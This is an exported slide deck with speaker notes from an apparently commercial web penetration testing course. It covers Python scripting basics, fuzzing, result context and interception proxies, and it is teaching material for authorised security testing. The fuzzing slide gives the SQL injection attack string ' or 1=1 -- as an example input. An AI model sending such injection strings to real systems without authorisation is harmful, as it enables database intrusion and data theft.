<!-- Automatically generated by Export-PptxToGitPITCHME.ps1
https://gist.github.com/valdeza/27845c35d14c833af63e449e5f055204 -->

<!-- Slide 1 -->
<!--[Rectangle 2]-->
Web Penetration Testing and Ethical Hacking  
Application Discovery

<!--[TextBox 4]-->
Copyright 2014, Secure Ideas
Version 1Q14

<!--[TextBox 2]-->
Professionally Evil   
Web Application 
Penetration Testing   
101.3

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Web applications are a major point of vulnerability in organizations today. Web app holes have resulted in the theft of millions of credit cards, major financial and reputational damage for hundreds of enterprises, and even the compromise of thousands of browsing machines that visited web sites altered by attackers. 

In the next few days, you'll learn the art of exploiting web applications so you can find flaws in your enterprise's web apps before the bad guys do. Through detailed, hands-on exercises and these materials, you will be taught the four-step process for web application penetration testing. You will inject SQL into back-end databases, learning how attackers exfiltrate sensitive data. You will utilize Cross Site Scripting attacks to dominate a target infrastructure in our unique hands-on laboratory environment. And, you will explore various other web app vulnerabilities in-depth, with tried-and-true techniques for finding them using a structured testing regimen. As well as the vulnerabilities, you will learn the tools and methods of the attacker, so that you can be a powerful defender.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 2 -->
<!--[Rectangle 2]-->
Course Outline

<!--[Rectangle 3]-->
- Day 1: Attacker's View, Pen-Testing and Scoping
- Day 2: Recon & Mapping
- **Day 3: Vulnerability Discovery**
- Day 4: Vulnerability Discovery Cont.
- Day 5: Exploitation
- Day 6: Capture the Flag

<!--[Right Arrow 3]-->

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
In this class, we will learn the practical art of web application penetration testing. 

On Day 1, we will examine the attacker's perspective, and learn why it is important for us to build and deploy web application with the attacker's perspective in mind. We will also cover the pieces of a penetration test and how to scope and prepare for one.  Finally, we will explore the methodology that will be covered through the rest of class.
 
During Day 2, we will step through the process that successful attackers use to exploit applications, focusing specifically on the reconnaissance and mapping stages of the process.  This will give us the foundation we need to later control the application.

On Day 3, we will build upon that foundation and start discovering the various weaknesses within the applications.  As penetration testers, we will map out the attack vectors that we are going to use against this application. These discoveries will be the basis for the exploitation phase.

On Day 4, we will continue our discovery focusing on client side components such as Flash and Java.  We will also explore the client-side scripting in use within our applications.

On Day 5, we will launch the attacks that we planned and created during the previous three sections. We will also cover the next steps for students and where they should go from here.

On Day 6, we will be performing a web application pen-test within a capture the flag event.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 3 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
- *** ******Vulnerability Discovery Overview***
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The discovery phase is the third step in our attack process, following after reconnaissance and mapping.  It builds upon the first two and then becomes the groundwork for the final phase, exploitation.  Today we are focusing on server-side vulnerabilities and how to find them.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 4 -->
<!--[Rectangle 2]-->
Vulnerability Discovery

<!--[Rectangle 3]-->
- In our methodology, this is the first explicitly "malicious" traffic being sent to target systems
	- Although please note that some people find port scans and aggressive application mapping to be malicious
- Discovery is where we really start prodding the web application
- We will be looking for potential weaknesses
- The purpose of this step is to find the path to exploitation
- This phase builds on the work and discoveries of the previous two steps
- Exploitation comes after this discovery phase
	- But some small exploitation to verify discovered flaws happens here
- We will focus on server-side vulnerability discovery in this session (PEWAPT101.3 and PEWAPT101.4)

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
Discovery is the phase in which we interact with the web application, pushing and prodding to discover weaknesses.  Up to this point we have merely been walking around the store, looking around.  While in the discovery phase, we begin pushing up ceiling tiles, opening doors, sitting in a corner of the store to see if the camera can see us.  

As always, make certain that any systems you interact with are within the scope of the engagement, and that you have explicit, written permission for your activities. Our first step is to identify potential vulnerabilities. Remember that all areas of input are interesting.  Hacking is all about attack surface.  What can you manipulate, and how can you leverage it to your benefit?  The only limit we have is our own imagination.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 5 -->
<!--[Title 1]-->
# Vuln Discovery Phase Elements and the Organization of PEWAPT101.3 & PEWAPT101.4


<!--[Content Placeholder 2]-->
- In our methodology, we first run automated web application vulnerability scanning tools to get a feel for potential flaws
- We then manually interact with the target to verify the presence of the flaw and determine its risk and implications
- And, finally, we may write one or more custom scripts tailored to the target application to exploit the flaw in a more impactful way than is possible manually
- This approach leads directly to the overall outline for PWAPT101.3 and PEWAPT101.4:
	- Scripting techniques for pen testers (focused here on Python) 
	- Descriptions of flaws and techniques for manual verification
	- Automated web app vulnerability scanning tools

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We have tried to organize today around methods and order we follow in a real test.  Normally we will run automated tools to find the low hanging fruit and walk rapidly through the application.  We then manually walk through the web application to verify the findings from the automated tools and to find other flaws.  Finally we will often create custom scripts to automate some of our findings.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 6 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
- *** Creating Custom Scripts for   
     Penetration Testing***
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We will now examine creating custom scripts for testing.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 7 -->
<!--[Rectangle 2]-->
Creating Custom Scripts for Penetration Testing

<!--[Rectangle 3]-->
- Web app pen testers often create custom scripts to use during a test
	- Especially during this vulnerability discovery phase
- These scripts can be used for many different testing and exploitation purposes
	- Parse through web content to find specific data
	- Harvest user names from an application
	- Iterate through page IDs
- Many scripting languages support HTTP requests and text processing
	- Perl, Ruby, Python, and more are all good examples
	- We recommend that if you know a given language already, use it
	- If you don't or you just want to expand your skills, learn Python
	- Most new tools are being written in Python, so this knowledge will also help you expand and fix tools you may very likely use in your tests

Note:
<!--[Rectangle 2]-->

<!--[Rectangle 3]-->
As we discussed earlier, many attackers will create custom scripts.  So should professional testers.  These scripts can be made to work within a very specific site.  Or they can be more generic but suited to a particular need the attacker has within many sites.

Since most languages support HTTP requests and processing the resulting text, you should use which ever language you are most familiar.  Even if that is VBScript.  But in this class we had to pick one, so we are going to cover Python.  While every language has its supporters and we don't want to start a language war in class, Python is currently being used to write most of the new web application testing tools.  So knowing the language will not only help us perform our tests better, it will also help us in troubleshooting and/or fixing and expanding or tools.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 8 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	- *** Python for Penetration Testing***
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We are now going to review Python from the perspective of a penetration tester.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 9 -->
<!--[Title 1]-->
# Why Python forWeb App Pen Testers?


<!--[Content Placeholder 2]-->
- Python is a simple language to understand
- Very readable language
	- Even if we are unfamiliar with the language
- Core libraries support HTTP handling
	- Requests, responses, and common data structures
- We are able to modify, change, or update many existing tools

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Python is a simple language to understand and learn.  It includes the libraries needed to handle HTTP as part of its core libraries, which means for most scripts we do not need to install anything beyond Python itself.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 10 -->
<!--[Title 1]-->
# Python


<!--[Content Placeholder 2]-->
- Python can be used to write  
both web applications and client   
programs
	- Simple scripting syntax that is compiled at run-time into byte-code 
- Released in 1991 by Guido van Rossum and as since sky-rocketed in popularity
- Comes pre-installed on Mac and Linux, easy to install on Windows
- Python released the 3.x series a few years ago, however it breaks compatibility with 2.x
	- We will cover 2.x in class as most tools are still using it

<!--[Picture 4]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Python is used as both a scripting language, which is what we will focus on, and as the language used within a web application.  It was released in 1991 by Guido van Rossum and has recently taken off as one of the most popular languages round.  Most Linux environments and Mac OSX include it as part of the system install.  Windows will need it installed.

The 3.x tree was released and breaks a lot of the backwards compatibility with 2.x.  We are going to focus on the 2.x tree as most tools still use it.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 11 -->
<!--[Title 1]-->
# Python Variables


<!--[Content Placeholder 2]-->
- Variables do not need to be declared and are loose typed
	name = "Monty Python and the Holy Grail"
	year = 1975
	movie = True
	print( name, year, movie )
- Lists can be used to store arrays of variables
	relics = ("Holy Grail", "Holy Hand Grenade of Antioch")
	print( relics[0] )
- Dictionaries can store name/value pairs
	knights = {"Lancelot":"the Brave", "Galahad":"the Pure",
	           "Robin":"Not-Quite-So-Brave-As-Sir-Lancelot"}
	print( knights["Robin"] )
	- 
	****

<!--[Rectangle 1]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
As with most scripting languages, each statement is a command to the language.  An interesting difference from the other languages we have discussed is that variables are not denoted with a $ or other special character.  The python processor recognizes the variables since they are not built-in commands.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 12 -->
<!--[Title 1]-->
# Comments and Code Blocks


<!--[Content Placeholder 2]-->
- Comments can be single line with # or multi-line with """ or '''
	# I don't want to talk to you no more
	"""you empty headed animal 
	food trough wiper"""
	'''Your mother was a hamster
	                and
	Your father smelt of elderberries'''
- Blocks of code are signaled with a colon followed by indented lines of code (4 space characters is recommended)
	questions = []
	if location == "Bridge of Death":
	    questions.append('What... is your name?')  
	    questions.append('What... is your quest?')
	    questions.append('What... is your favorite color?')

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Python requires us to pay attention to whitespace as it is how the language understands blocks of code such as loops and conditionals.

We use the hash (#) mark for single line comments. We can also do multi-line comments using the """ or the '''.

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 13 -->
<!--[Title 1]-->
# Python If Statement


<!--[Content Placeholder 2]-->
- If.Else Statement
her = human.object()
her.witch = False
if float(wood) and float(witch):
    if duck.weight == her.weight:
        her.witch = True
        burn(her)
else save(her)

<!--[Content Placeholder 2]-->
- No switch/case statement in Python
if *step == 1:*
*    build_wooden_rabbit()*
*elif step == 2:*
*    deliver_rabbit()*
*elif step == 3:*
    wait_till_nightfall()
elif step == 4:
    take_castle_by_surprise()
else:
*    build_large_wooden_badger()*

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Python is slightly different from the other covered languages as it does not have a switch statement.  For conditional functionality, we use the if/else construct.  When we have more than two conditions we chain elif (else if) statements for each condition we are testing for.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 14 -->
<!--[Title 1]-->
# Python Looping Structures


<!--[Content Placeholder 2]-->
- While loops run until test condition is true
	while blackknight.limbs > 0:
	    if fight(arthur):
	        blackknight.limbs = blackknight.limbs - 1
	    else:
	        blackknight.wins += 1
- For loops iterate over a list of items
	for swallow in [european, african, american, asian]:
	    print(swallow)
	for i in range(3):
	    answer = rawinput( bridgekeeper.question[i] )
	    if answer != bridgekeeper.question[i].answer:
	        print("Auuuuuuuugh!"
	        break
- Use continue and break for added control in loop structures

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
As with the other languages we cover, Python has the while  and for loops.  The while loop is for loops that need to run a variable numbers of times.  Such as if we are testing for session time-out, we may run a while loop checking to see if the html response is to redirect us to a login page.

The for loop is to run the code a specific number of times.  Keep in mind that the specific condition may not be a number.  It may be something like, run this for every line in a file.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 15 -->
<!--[Title 1]-->
# Python Functions


<!--[Content Placeholder 2]-->
- Python functions must be declared before use using def keyword
- To return data from a function, use the **return *****var***** **statement within the function
- To call a function use **functionname(**) with required inputs
- 
	def *air_speed_velocity*(*mass, frequency, amplitude):*
	*    '''algorithm from http://style.org/unladenswallow/'''*
	    answer *= 3 * frequency * amplitude*
	*    return answer*
	
	''' Call function to calculate air speed velocity for European swallow'''
	air_speed_velocity(20.3 , 15, 22)

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Functions are used to create reusable pieces of code.  These can be declared anywhere in the code, but Python requires that they are defined before we try to use them.  

To define a function, simply call def functionname().  We then can place any variables we want to accept within the function between the ().

The return statement will return data from the function to the section of code that called it.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 16 -->
<!--[Title 1]-->
# Python Standard Library


<!--[Content Placeholder 2]-->
- One of the powers of Python is the standard library
- This library contains the ability for many of the common actions we need for our tests
	- Simple HTTP libraries are part of the standard
- Some examples abilities:
	- Regular Expressions
	- gzip compression
	- sha1 hashing
	- HTML parsing

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
One of the main reasons that Python is so popular is its standard library.  Unlike many languages where we are forced to install packages and modules to perform most of what we want to do, Python includes many of the most common functions.  Some examples that are of interest to us are HTTP processing, regular expression handling, compression utilities and encryption.  There is even basic functionality to parse HTML!

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 17 -->
<!--[Title 1]-->
# Making HTTP Requestswithin Python


<!--[Content Placeholder 2]-->
- Built-in HTTP handlers
	- httplib, urllib and urllib2
- Simple to create a request
import httplib
conn = httplib.HTTPConnection("www.secureideas.com")
url = "/index.php"
conn.request("GET", url)
resp = conn.getresponse()
- Above code makes a GET request to www.secureideas.com
	- Retrieves the index.php file

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Three libraries are available to do various things with HTTP.  (This is one of the big changes in Python 3.0, they are consolidated.)  

To perform a simple request and retrieve the response, the script above makes use of the httplib.  Once we have made the connection and sent the request, the response is assigned to the resp variable.

We can then use statements such as the resp.getheader() to retrieve the various headers in the response.  For example:

 print resp.getheader("Set-Cookie")

will print any cookies being set in this response.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 18 -->
<!--[Title 1]-->
# Accessing Files in Python


<!--[Content Placeholder 2]-->
- File objects are created using open
	infile=open('usernames.txt', 'r')
- Various methods available
	- read loads the entire file into a string
	- readline reads one line of the file
	- readlines returns the entire file as a list
	- write writes to the file
- close removes the file object
- Loop through the file using a for loop
- for line in infile:
	- do action per line

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Another simple function is accessing files.  It is very common for us to want to read files that contain items for our test, passwords and user names are two examples that spring to mind.  We also want to write results to a file quite often.  Python provides access to a file handle using the open statement.  Once we have that handle, we can either read or write to the file.

Reading files is done through three different methods:
	read which loads the entire file into a string
	readline which retrieves one line from the file
	readlines which returns the file and a series of lines in a list

Python allows us to loop through the file by using the following for loop:
	for line in infile:

Writing files is simple using the write method.
	file.write('String to write to the file')

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 19 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	- *** Exercise: Python Scripting ****** *********
-  Web App Vulnerabilities and Manual  
   Verification Techniques
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
In this exercise, we will write a series of scripts based on what we have just learned.  These scripts can then be used as a basis for scripts during our real penetration tests after class is finished.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 20 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
- *** Web App Vulnerabilities and Manual  
   Verification Techniques***
-  Interception Proxies
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Now that we have covered automated testing, we will start exploring manual methods for discovering flaws.

Here is a list of common attacks we will be covering:
			-  Information Leakage
			-  Username Harvesting
			-  Command Injection
			-  SQL Injection
			-  Blind SQL Injection
			-  Cross Site Scripting
			-  Cross Site Request Forgery
We will cover the means to discover these vulnerabilities and work toward full blown exploitation.


<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 21 -->
<!--[Title 1]-->
# Understanding Web App Vulnerability Types


<!--[Content Placeholder 2]-->
- The automated scanners we've covered so far may indicate potential flaws in target applications
- We need to understand in depth the types of vulnerabilities we may discover
- And, we need to look at techniques for manually verifying discovered vulnerabilities
	- Helps reduce false positives, making our reports more accurate and actionable
	- May give us a better understanding of the risks associated with a flaw
	- Can also lead directly to the next phase of the methodology: Exploitation
- With that in mind, much of the rest of this session is devoted to in-depth analysis of various types of web app flaws, including techniques for manual verification
	- We will also discuss Burp Suite, a great collection of tools for manual verification
	- 

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Now that we have reviewed some of the automated scanners and tool collections, it is time to understand and explore the various types of flaws in applications.  

We also need to understand methods for manually verify that the flaw exists and examine how to exploit it.  This reduces false positives, which ruin reports and gives us a better understanding of the risks these flaws bring to the application.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 22 -->
<!--[Title 1]-->
# Fuzzing


<!--[Content Placeholder 2]-->
- Fuzzing is a common term used during testing
	- All security testing
- Fuzzing is sending random or psuedo-random strings
	- Via the various inputs
- Web testing mainly uses attack strings
	- Such as ' or 1=1 --
- We then examine the results 

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Fuzzing is a technique used throughout all the various types of security testing.  It is used to quickly assess the various input points looking for interesting results, interesting to testers of course. ?

To perform a fuzzing attack, we would choose the various input points and send random or psuedo-random strings at the application.  Once the inputs are all sent, we would look at the results to determine if we have any interesting results.  For example, we could send various SQL strings and look for database error messages in the result set.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 23 -->
<!--[Title 1]-->
# Examining Results


<!--[Content Placeholder 2]-->
- Reviewing the results are mandatory
	- Tools can help but this depends on us
- We look for differences
	- Deviations from *normal*
-  Work from a known good
	- From mapping
- Look for errors and status code changes
	- Response size is also helpful

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
This page intentionally left blank.

<!-- SKIPPED: [Slide Number Placeholder 4]-->

---

<!-- Slide 24 -->
<!--[Title 1]-->
# FuzzDB


<!--[Content Placeholder 2]-->
- We need a series of attack strings
	- To effectively fuzz an application
- FuzzDB is a project that provides these
	- http://code.google.com/p/fuzzdb
- It collects various attack strings
	- Categorizes them into files
- These files are fed into the attack tools

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Since we need a series of attack strings to perform fuzzing attacks and tests.  Of course we can build our own lists, but there is a prebuilt series of lists at the FuzzDB project.  This project, available at http://code.google.com/p/fuzzdb, has a series of lists for our use.  These lists are categorized based on what the target is, and we can then use these within whatever tool we are using.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 25 -->
<!--[Title 1]-->
# Context


<!--[Content Placeholder 2]-->
- Context is very important as we evaluate results
	- Determining false positives
- We need to truly evaluate the results
	- Based on the input
- We also need to understand what the flaw means
	- How do we determine that it exists
- For example, PHPinfo commonly shows as SQL injection
	- Due to its display of database drivers

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
As we perform our testing, both manual and automated, we need to evaluate the results.  This helps us determine if the finding is a false positive or a real problem within the application.  This evaluation is based on both the result obtained and the input sent in.  For example, if we sent in a XSS attack string, we would expect to see if echoed back the same way if the application was vulnerable to XSS.  Of course this also means that we need to understand what the flaw actually means and what we would be looking for!

One example that commonly shows as a false positive is the phpinfo function within PHP applications.  Since this function displays to the browser all of the information of the server's configuration, we see results saying it is vulnerable to SQL injection.  This is due to the test tools looking for database errors and seeing the database drivers listed on the page. Since they don't understand context, as we should, they do not realize the driver names are not part of an error message.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 26 -->
<!--[Title 1]-->
# Application Context


<!--[Content Placeholder 2]-->
- The first context is the application's
	- No application runs in a void
	- Even if that is how we are asked to test it ?
- The application's context helps us understand the risk
	- What does this application do? 
	- Where is it on the network? 
	- Who has access to it?
- By answering this context question, we can better evaluate what to test
	- Testing user name harvesting on a phone book is *probably *not important

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
Application context is one that many people miss.  They focus on testing for vulnerabilities but forget that the application is important.  We have to remember that this testing and the running of this application are not within a void.  This is made more difficult to remember since so often we are tasked to test a single application, ignoring all of the pieces and systems that reside within the target network.

One of the main purposes of a penetration test is to understand the risk.  To accomplish this, we have to ask ourselves a series of questions:
	- What does this application do? 
	- Where is it on the network? 
	- Who has access to it?

By answering these questions, we can then better understand where our testing and the flaws uncovered will take us.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 27 -->
<!--[Title 1]-->
# Vulnerability Context


<!--[Content Placeholder 2]-->
- Vulnerabilities also have a context
	- Where do they exist?
- First are they server or client focused?
	- SQL injection is VERY different from XSS
- Second where do they run?
	- Is it on a browser internal to the client or is it on a web server in the DMZ?
- This context has to be considered
	- As we choose tools and techniques

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The second category is the context of the vulnerability.  We are the testers have to understand what this context is as it controls what we do with it.  There are two parts to this context.

First we have to understand a series of questions regarding the vulnerability.  We need to understand if this vulnerability is focused on the server portion of the application or the client running it.  Related to this is understanding where it runs.  For example, if it's SQL injection, it will run within the database but if it is command injection, it runs on the web application server.  This affects how we will then exploit this due to where it runs.

Finally we need to pick the right tools and techniques to discover the potential flaw and then exploit it.

<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 28 -->
<!--[Title 1]-->
# Exploit Context


<!--[Content Placeholder 2]-->
- The exploit itself is part of the vulnerability context
	- The exploit runs where the   
vulnerability is
- We have to pay attention   
to its execution
	- To ensure it runs
- Server-side exploits need to   
work within the code or query execution
	- SQL injection fits within an existing query
- Client-side exploits depend on where they land
	- Is the XSS code within HTML or another script?

<!--[Picture 3]-->

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
The exploit itself is part of the context we are looking at when we evaluate the vulnerability.  Where it runs will affect how we exploit it and what the payload is.  This execution is where we have to pay attention to ensure that we are not lulled into thinking a flaw doesn't exist because we messed up its exploitation.  This attention needs to take into account which type of flaw it is.

First, we need to think about server-side flaws.  Keep in mind that the exploit will be running within the processing of the application.  This means that there will be remnants of the code and logic to take into account.  For example, if we are running SQL injection, we have to ensure that our injection runs within the context of the existing query.  This is harder to do since we can't examine the processing on the server typically.

For client-side flaws this is easier because we can see where our exploit lands.  But we need to pay attention.  For example, if we are attacking a cross site scripting flaw, where does our payload appear in the client-side code?  If it's within another tag, our exploit has to finish that tag.


<!-- SKIPPED: [Slide Number Placeholder 3]-->

---

<!-- Slide 29 -->
<!--[Rectangle 1041]-->
Course Roadmap

<!--[Rectangle 1042]-->
- Attacker's View of   
the Web
- Recon & Mapping
- <span style="text-decoration: underline;">***Server-Side Vuln  
Discovery***</span>
- Server-Side Vuln  
Discovery Cont.
- Exploitation
- Capture the Flag

<!--[Freeform 1044]-->

<!--[Rectangle 1043]-->
-  Vulnerability Discovery Overview
-  Creating Custom Scripts for   
     Penetration Testing
	-  Python for Penetration Testing
	-  Exercise: Python Scripting  
-  Web App Vulnerabilities and Manual  
   Verification Techniques
- *** ******Interception Proxies***
	-  Fiddler
	-  OWASP Zed Attack Proxy
	-  Burp Suite
	- Interception Exercise 
-  Information Leakage &   
    Directory Browsing
- Directory Browsing Exercise
-  Username Harvesting
-  Username Harvesting Exercise
-  Command Injection
-  Command Injection Exercise
-  Directory Traversal
-  SQL Injection
-  SQL Injection Exercise
-  Blind SQL Injection

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
We will now explore various interception proxies commonly used in penetration testing.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 30 -->
<!--[Title 1]-->
# Interception Tools


<!--[Content Placeholder 2]-->
- Interception is one of our main goals
	- Can we get between the application and the server
- Interception tools do more than intercept
	- They can analyze the traffic
	- They can inject attacks

<!--[Rectangle 3]-->

<!--[Straight Connector 4]-->

<!--[Object 1026]-->

<!--[Text Box 51]-->
**Mobile Device**

<!--[Object 1026]-->

<!--[Text Box 51]-->
**Web Application**

<!--[Up-Down Arrow Callout 9]-->

<!--[Text Box 51]-->
**Interception Tool**

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
When we look at penetration testing of web applications, interception of the traffic is one of our main goals.  This allows us to *get into* the traffic between the server and the client.  We are able to then capture that traffic and in most cases modify it to test the security of the application.

<!-- SKIPPED: [Slide Number Placeholder 1]-->

---

<!-- Slide 31 -->
<!--[Title 1]-->
# Setting up Interception Methods


<!--[Content Placeholder 2]-->
- Interception can be done multiple ways
	- Each requires a different set up
- For sniffers
	- We capture traffic on the same network as the device
- For interception proxy
	- We configure the device to connect to the proxy or interception machine
- HTTPS can cause us issues
	- Sniffers can't *see *the traffic
	- Interception tools MitM the connection so our device has to trust the certificate

Note:
<!-- SKIPPED: [Slide Image Placeholder 1]-->

<!--[Notes Placeholder 2]-->
There are two basic methods to intercept traffic.  The first is via a sniffer.  The network sniffer can capture the traffic for us to analyze and will capture all traffic on a network interface or what ever traffic we specify via a filter.

The main method we use though is an interception proxy.  This type of tool actually acts as a proxy to the application (often a browser) and the tester is able to see, change and resubmit the traffic the browser/user was sending to the application.

We do find that HTTPS can cause issues for our testing.  For example, our sniffer won't be able to decrypt the traffic, unless we have the key.  We also have certificate errors in the browser if we don't trust the certificate.  We need to configure our browser to accept the certifying authority from our interception proxy.

